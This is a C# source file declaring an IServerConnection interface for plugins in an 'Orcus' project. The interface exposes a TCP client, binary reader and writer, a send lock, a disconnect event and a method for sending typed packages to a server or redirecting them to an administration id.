using System;
using System.IO;
using System.Net.Sockets;
using Orcus.Shared.Connection;

namespace Orcus.Plugins
{
    /// <summary>
    ///     Provides information about the connection to the server
    /// </summary>
    public interface IServerConnection : IDisposable
    {
        /// <summary>
        ///     The binary reader
        /// </summary>
        BinaryReader BinaryReader { get; }

        /// <summary>
        ///     The binary writer
        /// </summary>
        BinaryWriter BinaryWriter { get; }

        /// <summary>
        ///     The lock object guarantees that the <see cref="BinaryWriter" /> is only executed once at the same time. You must
        ///     lock that if you access the <see cref="BinaryWriter" />
        /// </summary>
        object SendLock { get; }

        /// <summary>
        ///     The tcp client
        /// </summary>
        TcpClient TcpClient { get; }

        /// <summary>
        ///     Called, when the server shuts down
        /// </summary>
        event EventHandler Disconnected;

        /// <summary>
        ///     Send a package to the server
        /// </summary>
        /// <param name="serverPackageType">The type of the package</param>
        /// <param name="data">The data regarding the <see cref="serverPackageType" /></param>
        /// <param name="redirectPackage">
        ///     True if the package should get redirected to the administration with the id
        ///     <see cref="administrationId" />
        /// </param>
        /// <param name="administrationId">The administration id if the package should get redirected</param>
        void SendServerPackage(ServerPackageType serverPackageType, byte[] data, bool redirectPackage,
            ushort administrationId);
    }
}